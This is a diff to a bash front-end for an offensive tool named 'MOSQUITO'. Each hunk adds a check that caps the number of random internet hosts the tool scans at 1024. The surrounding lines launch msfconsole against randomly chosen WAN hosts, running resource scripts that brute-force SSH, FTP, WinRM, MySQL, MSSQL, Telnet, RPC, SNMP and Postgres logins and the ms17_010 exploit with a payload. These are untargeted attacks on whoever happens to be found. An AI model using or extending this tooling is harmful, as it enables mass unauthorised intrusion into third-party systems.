@@ -261,6 +261,14 @@ sh_two () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for targets"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource brute_force.rc"
    else
@@ -300,6 +308,14 @@ sh_tree () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg LHOST $IPADDR;setg PAYLOAD $payload;resource ms17_010.rc"
    else
@@ -337,6 +353,14 @@ sh_quatro () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource ssh_brute.rc"
    else
@@ -375,6 +399,14 @@ sh_cinco () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 400 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource ftp_brute.rc"
    else
@@ -412,6 +444,14 @@ sh_six () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource http_CVE.rc"
    else
@@ -450,6 +490,14 @@ sh_seven () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 800 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg PAYLOAD $payload;resource winrm_brute.rc"
    else
@@ -487,6 +535,14 @@ sh_oito () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource mysql_brute.rc"
    else
@@ -524,6 +580,14 @@ sh_nine () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource mssql_brute.rc"
    else
@@ -561,6 +625,14 @@ sh_ten () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 600 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource telnet_brute.rc"
    else
@@ -598,6 +670,14 @@ sh_onze () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 800 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource rpc_brute.rc"
    else
@@ -635,6 +715,14 @@ sh_twelve () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource snmp_brute.rc"
    else
@@ -672,6 +760,14 @@ sh_twelve () {
    elif [ "$scan" = "Random search WAN for rhosts" ]; then
       echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
       sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1
+
+      max="1024"
+      ## Make sure the LIMMIT value did not have exceded the max allowed
+      if [ $sealing -gt $max ]; then
+         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
+         sealing="1024"
+         sleep 1
+      fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
       msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource postgres_brute.rc"
    else
@@ -711,7 +807,8 @@ scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning metho
 #                   * 🦟 MOSQUITO MAIN MENU 🦟 *                  #
 ###################################################################
 sh_main () {
-echo "main menu" > /dev/null 2>&1
+rm -f ip_range.txt > /dev/nul 2>&1
+rm -f 1024 > /dev/nul 2>&1
 }
 # loop forever
 while :
